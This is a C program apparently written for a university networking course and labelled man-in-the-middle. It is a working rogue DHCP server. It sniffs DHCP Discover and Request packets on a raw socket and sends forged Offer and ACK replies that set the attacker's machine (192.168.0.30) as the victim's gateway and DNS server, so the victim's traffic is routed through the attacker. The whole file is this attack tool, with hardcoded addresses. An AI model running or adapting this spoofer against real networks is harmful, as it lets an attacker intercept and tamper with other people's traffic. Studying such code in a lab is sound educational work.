/*  Copyright (C) 2020  Marcelo (marcelo.holgado@edu.pucrs.br)
    Este programa foi desenvolvido para disciplina de Redes de comunicação II
    do curso de Engenharia de Computação

    MAN-IN-THE-MIDDLE
*/
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>  //estrutura ifr
#include <netinet/ether.h> //header ethernet
#include <netinet/in.h> //definicao de protocolos
#include <arpa/inet.h> //funcoes para manipulacao de enderecos IP
#include<netinet/ip_icmp.h>	//Provides declarations for icmp header
#include<netinet/udp.h>	//Provides declarations for udp header
#include<netinet/tcp.h>	//Provides declarations for tcp header
#include<netinet/ip.h>	//Provides declarations for ip header
#include <netinet/in_systm.h> //tipos de dados
#include <netpacket/packet.h>
#include <net/ethernet.h> 
#include "dhcp_1.2.h"  // struct dhcp
//DEFINES
#define PRINTS 
#define NOME_INTF "enp0s3" // Nome da interace de rede

//Sockets
int sock_raw;int sockraw;int dhpro = 0;
unsigned char *sdbuffer;
unsigned char *buffer;
unsigned long int tot_len = 0, tot2 = 0;
// structs usadas para receber
struct ifreq intrecv, intsend, intether, intip;
struct iphdr *iph_recv;
struct udphdr *udph_recv;
struct dhcp_packet *dhcp_recv;
//  struct para enviar
struct ethhdr *ether_send;
struct iphdr *iph_send;
struct udphdr *udp_send;
struct dhcp_packet *dhcp_send;
//Predeclaração das funções
void prepDHCPack();
void constructEther(char *);
void constructIP(char *);
void constructUDP();
void constructDHCPOffer();
void constructDHCPACK();
void printDHCP();
int getInterfaceRecv(char *);
int getInterfaceSend(char *);
int sendDHCP(unsigned char *); 
int buscaDHCPType(); 

// Main function 
int main(int argc,char *argv[])
{
	int saddr_size , data_size;unsigned short iphdrlen; int verify;
	struct sockaddr saddr;
	struct in_addr in;
	buffer = (unsigned char *)malloc(65536); // Buffer to get packets
	
	sock_raw = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if(sock_raw < 0){
		printf("Socket Error\n");
		return 1;
	}
	verify = getInterfaceRecv(NOME_INTF);
	if (verify < 0) {
		printf("Erro para definir a interface, verifique que você escolheu a interface correta!");
		exit(1);
	}
	printf("\nBuscando pacotes DHCP ...\n");
	while(1) {
		saddr_size = sizeof saddr;
		//Receive a packet
		data_size = recvfrom(sock_raw , buffer , 65536 , 0 , &saddr , &saddr_size);
		if(data_size < 0){
			printf("Error recebendo pacotes\n");
			return 1;
		}
		prepDHCPack();
		if (iph_recv->protocol == 17) {  // Se for um pacote UPD continua	
			if (ntohs(udph_recv->dest) == 67) { // È UM PACOTE DHCP?
				dhpro = buscaDHCPType();
				if (dhpro == 1) { // A Discovery message
					printDHCP();
					printf("   |-DHCP Message Type: (Discovery)\n");
					sendDHCP(buffer);
					dhpro = 0;
					break;
				}
			}
		}
	}
	while(1) {
		saddr_size = sizeof saddr;
		//Receive a packet
		data_size = recvfrom(sock_raw , buffer , 65536 , 0 , &saddr , &saddr_size);
		if(data_size < 0){
			printf("Error recebendo pacotes\n");
			return 1;
		}
		prepDHCPack();
		if (iph_recv->protocol == 17) {  // Se for um pacote UPD continua			
			if (ntohs(udph_recv->dest) == 67) { // È UM PACOTE DHCP?
				dhpro = buscaDHCPType();
				if (dhpro == 3) { // A Discovery message 
					printDHCP();
					printf("   |-DHCP Message Type: (Release)\n");
					sendDHCP(buffer);
					dhpro = 0;
					break;
				}
			}
		}
	}
	close(sock_raw);
	return 0;
}
void printDHCP() {
	printf("\nIPv4 PROTOCOL\n");
	printf("   |-Version      : %d\n" , ntohs(iph_recv->version));
	printf("   |-Destination Address : %d\n" , ntohs(iph_recv->daddr));
	printf("   |-Source Address      : %d\n" , ntohs(iph_recv->saddr));
	printf("\nUDP PROTOCOL\n");
	printf("   |-Source Port      : %d\n" , ntohs(udph_recv->source));
	printf("   |-Destination Port : %d\n" , ntohs(udph_recv->dest));
	printf("   |-UDP Length       : %d\n" , ntohs(udph_recv->len));
	printf("   |-UDP Checksum     : %d\n" , ntohs(udph_recv->check));				

	printf("\nDHCP PROTOCOL\n");
}



int getInterfaceRecv(char *str) 
{
	strcpy(intrecv.ifr_name, str);
	if (ioctl(sock_raw, SIOCGIFINDEX, &intrecv) < 0) { 
		return -1;
	}
	ioctl(sock_raw, SIOCGIFINDEX, &intrecv);
	intrecv.ifr_flags |= IFF_PROMISC;
	ioctl(sock_raw, SIOCGIFINDEX, &intrecv);
	return 0;
}
void prepDHCPack() {
	int iphdrlen;
	iph_recv = (struct iphdr*)(buffer + sizeof(struct ethhdr));
	iphdrlen = iph_recv->ihl*4;
	udph_recv = (struct udphdr*)(buffer + iphdrlen + sizeof(struct ethhdr));
	int header_size =  sizeof(struct ethhdr) + iphdrlen + sizeof(udph_recv);
	dhcp_recv= (struct dhcp_packet*)(buffer + header_size);
}
int buscaDHCPType() 
{   
	int aux;
	for (int i = 0; i < 10; i++) {
		if (dhcp_recv->options[i] == 0x35) {
			aux = (int)dhcp_recv->options[i+2];	
			break;
		}
	}
	return aux;
}
int getInterfaceSend(char *str)
{
	memset(&intsend,0,sizeof(intsend));
	strcpy(intsend.ifr_name, str);

	if((ioctl(sock_raw,SIOCGIFINDEX,&intsend)) < 0 ) {
		return -1;
	}
	return 0;
}

void constructEther(char *str)
{
	memset(&intether,0,sizeof(intether));
	strcpy(intether.ifr_name,str);

	if((ioctl(sock_raw,SIOCGIFHWADDR,&intether)) < 0){
		printf("Error ioctl() verifique o nome da interface de rede\n");
	}
	// Construct the Ethernet header
	ether_send = (struct ethhdr *)(sdbuffer);
	// Fill ether struct with source MAC
	ether_send->h_source[0] = (unsigned char)(intether.ifr_hwaddr.sa_data[0]);
	ether_send->h_source[1] = (unsigned char)(intether.ifr_hwaddr.sa_data[1]);
	ether_send->h_source[2] = (unsigned char)(intether.ifr_hwaddr.sa_data[2]);
	ether_send->h_source[3] = (unsigned char)(intether.ifr_hwaddr.sa_data[3]);
	ether_send->h_source[4] = (unsigned char)(intether.ifr_hwaddr.sa_data[4]);
	ether_send->h_source[5] = (unsigned char)(intether.ifr_hwaddr.sa_data[5]);
	// Fill ether struct with destination MAC
	ether_send->h_dest[0] = buffer[6];
	ether_send->h_dest[1] = buffer[7];
	ether_send->h_dest[2] = buffer[8];
	ether_send->h_dest[3] = buffer[9];
	ether_send->h_dest[4] = buffer[10];
	ether_send->h_dest[5] = buffer[11];
	ether_send->h_proto = htons(ETH_P_IP);
}
void constructIP(char *str)
{
	memset(&intip,0,sizeof(intip));
	strcpy(intip.ifr_name,str);

	if((ioctl(sock_raw,SIOCGIFHWADDR,&intip)) < 0){
		printf("Error ioctl() verifique o nome da interface de rede\n");
	}
	iph_send = (struct iphdr *)(sdbuffer + sizeof(struct ethhdr));
	// Construct the IP header
	iph_send->ihl = 5;
	iph_send->version = 4;
	iph_send->id = 0xdead;
	iph_send->ttl = 128;
	iph_send->protocol = 17;
	iph_send->saddr = inet_addr("192.168.0.30");
	if (dhpro == 1) { // A Discovery message 
		iph_send->daddr = inet_addr("192.168.0.70");
	}
	else if (dhpro == 3) { // A Request message 
		iph_send->daddr = inet_addr("192.168.0.70");
	}	
	iph_send->check = 0;
}
void constructUDP() 
{	// Construct the UDP header
	udp_send = (struct udphdr *)(sdbuffer + sizeof(struct iphdr)+sizeof(struct ethhdr));
	udp_send->source = htons(67);
	udp_send->dest = htons(68);
	udp_send->check = 0;
	if (dhpro == 1) { // A Discovery message 
		constructDHCPOffer();
	}
	else if (dhpro == 3) { // A Request message 
		constructDHCPACK();
	}	
	udp_send->len = ntohs(sizeof(struct dhcp_packet)-sizeof(struct udphdr)-4);
	// + sizeof(struct udphdr)
}
void constructDHCPOffer() 
{	
	dhcp_send = (struct dhcp_packet *)(sdbuffer + sizeof(struct udphdr) + sizeof(struct iphdr)+sizeof(struct ethhdr));
	dhcp_send->op 	  = 0x02;
	dhcp_send->htype  = 0x01;
	dhcp_send->hlen   = 0x06;  
	dhcp_send->hops   = 0x00;
	dhcp_send->xid	  = dhcp_recv->xid;
	dhcp_send->secs   = 0x00;
	dhcp_send->flags  = 0x00;
	dhcp_send->ciaddr = 0x00000000;
	dhcp_send->yiaddr = inet_addr("192.168.0.70");
	dhcp_send->siaddr = inet_addr("192.168.0.30");
	dhcp_send->giaddr = 0x00000000;
	dhcp_send->chaddr[0] = buffer[6];	//mac[0]   
	dhcp_send->chaddr[1] = buffer[7];	//mac[1]
	dhcp_send->chaddr[2] = buffer[8];	//mac[2]
	dhcp_send->chaddr[3] = buffer[9];	//mac[3]dhcp_send
	dhcp_send->chaddr[4] = buffer[10];	//mac[4]
	dhcp_send->chaddr[5] = buffer[11];	//mac[5]
	for(int i = 0; i < DHCP_SNAME_LEN; i++)	{
		dhcp_send->sname[i] = 0x00;
	}
	for (int i = 0; i < DHCP_FILE_LEN; i++){
		dhcp_send->file[i] = 0x00;
	}
	dhcp_send->magic[0] = 0x63;
	dhcp_send->magic[1] = 0x82;
	dhcp_send->magic[2] = 0x53;
	dhcp_send->magic[3] = 0x63;

	dhcp_send->options[0] = 0x35;	// type
	dhcp_send->options[1] = 0x01;	// length
	dhcp_send->options[2] = 0x02; 	// DHCPOFFER

	dhcp_send->options[3] = 0x01;     // máscara da rede
	dhcp_send->options[4] = 0x04;     // length
	dhcp_send->options[5] = 0xFF;  // 255  
	dhcp_send->options[6] = 0xFF;  // 255  
	dhcp_send->options[7] = 0xFF;  // 255  
	dhcp_send->options[8] = 0x00;  //  0

	dhcp_send->options[9] = 0x03;     // DHCP router
	dhcp_send->options[10] = 0x04; 	// length
	dhcp_send->options[11] = 0xC0;  //  192
	dhcp_send->options[12] = 0xA8;  //  168
	dhcp_send->options[13] = 0x00;  //  0
	dhcp_send->options[14] = 0x1E;  //  30

	dhcp_send->options[15] = 0x33; // Tempo do ip
	dhcp_send->options[16] = 0x04;
	dhcp_send->options[17] = 0x00;
	dhcp_send->options[18] = 0x00; 
	dhcp_send->options[19] = 0x0E;
	dhcp_send->options[20] = 0x10;

	dhcp_send->options[21] = 0x36; // DHCP Server Identifier
	dhcp_send->options[22] = 0x04; // length
	dhcp_send->options[23] = 0xC0;
	dhcp_send->options[24] = 0xA8;
	dhcp_send->options[25] = 0x00;
	dhcp_send->options[26] = 0x1E;

	dhcp_send->options[27] = 0x3A; // Renewal Time Value
	dhcp_send->options[28] = 0x04;
	dhcp_send->options[29] = 0x00;
	dhcp_send->options[30] = 0x00;
	dhcp_send->options[31] = 0x07;
	dhcp_send->options[32] = 0x08;

	dhcp_send->options[33] = 0x3B; // Rebinding Time Value
	dhcp_send->options[34] = 0x04;
	dhcp_send->options[35] = 0x00;
	dhcp_send->options[36] = 0x00;
	dhcp_send->options[37] = 0x0C;
	dhcp_send->options[38] = 0x4E;

	dhcp_send->options[39] = 0x06; // Domain Name Server
	dhcp_send->options[40] = 0x04;
	dhcp_send->options[41] = 0xC0;
	dhcp_send->options[42] = 0xA8;
	dhcp_send->options[43] = 0x00;
	dhcp_send->options[44] = 0x1E;

	dhcp_send->options[45] = 0xFF;  //  Fim fo pacote dhcp
}
void constructDHCPACK() 
{	
	dhcp_send = (struct dhcp_packet *)(sdbuffer + sizeof(struct udphdr) + sizeof(struct iphdr)+sizeof(struct ethhdr));
	dhcp_send->op 	  = 0x02;
	dhcp_send->htype  = 0x01;
	dhcp_send->hlen   = 0x06;  
	dhcp_send->hops   = 0x00;
	dhcp_send->xid	  = dhcp_recv->xid;
	dhcp_send->secs   = 0x00;
	dhcp_send->flags  = 0x00;
	dhcp_send->ciaddr = 0x00000000;
	dhcp_send->yiaddr = inet_addr("192.168.0.70");
	dhcp_send->siaddr = inet_addr("192.168.0.30");
	dhcp_send->giaddr = 0x00000000;
	dhcp_send->chaddr[0] = buffer[6];	//mac[0]   
	dhcp_send->chaddr[1] = buffer[7];	//mac[1]
	dhcp_send->chaddr[2] = buffer[8];	//mac[2]
	dhcp_send->chaddr[3] = buffer[9];	//mac[3]dhcp_send
	dhcp_send->chaddr[4] = buffer[10];	//mac[4]
	dhcp_send->chaddr[5] = buffer[11];	//mac[5]
	for(int i = 0; i < DHCP_SNAME_LEN; i++)	{
		dhcp_send->sname[i] = 0x00;
	}
	for (int i = 0; i < DHCP_FILE_LEN; i++){
		dhcp_send->file[i] = 0x00;
	}
	dhcp_send->magic[0] = 0x63;
	dhcp_send->magic[1] = 0x82;
	dhcp_send->magic[2] = 0x53;
	dhcp_send->magic[3] = 0x63;

	dhcp_send->options[0] = 0x35;	// type
	dhcp_send->options[1] = 0x01;	// length
	dhcp_send->options[2] = 0x05; 	// DHCP ACK

	dhcp_send->options[3] = 0x01;     // máscara da rede
	dhcp_send->options[4] = 0x04;     // length
	dhcp_send->options[5] = 0xFF;  // 255  
	dhcp_send->options[6] = 0xFF;  // 255  
	dhcp_send->options[7] = 0xFF;  // 255  
	dhcp_send->options[8] = 0x00;  //  0

	dhcp_send->options[9] = 0x03;     // DHCP router
	dhcp_send->options[10] = 0x04; 	// length
	dhcp_send->options[11] = 0xC0;  //  192
	dhcp_send->options[12] = 0xA8;  //  168
	dhcp_send->options[13] = 0x00;  //  0
	dhcp_send->options[14] = 0x1E;  //  

	//dhcp_send->options[15] = 0x17; // Default IP Time-to-Live
	//dhcp_send->options[16] = 0x01;
	//dhcp_send->options[17] = 0x40;

	dhcp_send->options[15] = 0x33; // Tempo do ip
	dhcp_send->options[16] = 0x04;
	dhcp_send->options[17] = 0x00;
	dhcp_send->options[18] = 0x00; 
	dhcp_send->options[19] = 0x0E;
	dhcp_send->options[20] = 0x10;

	dhcp_send->options[21] = 0x36; // DHCP Server Identifier
	dhcp_send->options[22] = 0x04; // length
	dhcp_send->options[23] = 0xC0;
	dhcp_send->options[24] = 0xA8;
	dhcp_send->options[25] = 0x00;
	dhcp_send->options[26] = 0x1E;

	dhcp_send->options[27] = 0x3A; // Renewal Time Value
	dhcp_send->options[28] = 0x04;
	dhcp_send->options[29] = 0x00;
	dhcp_send->options[30] = 0x00;
	dhcp_send->options[31] = 0x07;
	dhcp_send->options[32] = 0x08;

	dhcp_send->options[33] = 0x3B; // Rebinding Time Value
	dhcp_send->options[34] = 0x04;
	dhcp_send->options[35] = 0x00;
	dhcp_send->options[36] = 0x00;
	dhcp_send->options[37] = 0x0C;
	dhcp_send->options[38] = 0x4E;

	dhcp_send->options[39] = 0x06; // Domain Name Server
	dhcp_send->options[40] = 0x04;
	dhcp_send->options[41] = 0xC0;
	dhcp_send->options[42] = 0xA8;
	dhcp_send->options[43] = 0x00;
	dhcp_send->options[44] = 0x1E;

	dhcp_send->options[45] = 0xFF;  //  Fim fo pacote dhcp
}

// This function caculate the checksum
unsigned short checksum(unsigned short *buff, int _16bitword) 
{
	unsigned long sum;
	for(sum=0;_16bitword>0;_16bitword--)
		sum+=htons(*(buff)++);
	do
	{
		sum = ((sum >> 16) + (sum & 0xFFFF));
	}
	while(sum & 0xFFFF0000);

	return (~sum);
}

// It is for send offer packets
int sendDHCP(unsigned char *buffer) 
{
	int verify = 0, send_len;
	sockraw = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if(sockraw < 0)	{
		printf("Socket Error\n");
		return -1;
	}
	sdbuffer = (unsigned char *)malloc(65536); // Allocate some space
	memset(sdbuffer,0,65536);

	verify = getInterfaceSend(NOME_INTF);  
	if (verify < 0){
		printf("Erro sendOffer(), getInterfaceSend(), verifique o nome da interface\n");
	}
	constructEther(NOME_INTF);
	constructIP(NOME_INTF);
	constructUDP();
	
	// calcula o tamnho dos pacotes	
	tot_len = (sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dhcp_packet));
	iph_send->tot_len = htons(tot_len - sizeof(struct iphdr));	
	iph_send->check	= 0;
	iph_send->check	= htons(checksum((unsigned short*)(sdbuffer + sizeof(struct ethhdr)), (sizeof(struct iphdr)/2)));
	udp_send->check = 0;
	
	printf("\nCalculou checksum\n");

	struct sockaddr_ll sdaddr_ll;
	sdaddr_ll.sll_ifindex = intsend.ifr_ifindex;
	sdaddr_ll.sll_halen   = ETH_ALEN;
	sdaddr_ll.sll_addr[0] = buffer[6];
	sdaddr_ll.sll_addr[1] = buffer[7];
	sdaddr_ll.sll_addr[2] = buffer[8];
	sdaddr_ll.sll_addr[3] = buffer[9];
	sdaddr_ll.sll_addr[4] = buffer[10];
	sdaddr_ll.sll_addr[5] = buffer[11];

	send_len = sendto(sockraw,sdbuffer,tot_len,0,(struct sockaddr*)&sdaddr_ll,sizeof(struct sockaddr_ll));			
	if (send_len < 0) {
		printf("\nErro sending packet\n");
		return -1;
	}
	printf("Enviou\n\n");
	return 0;
}
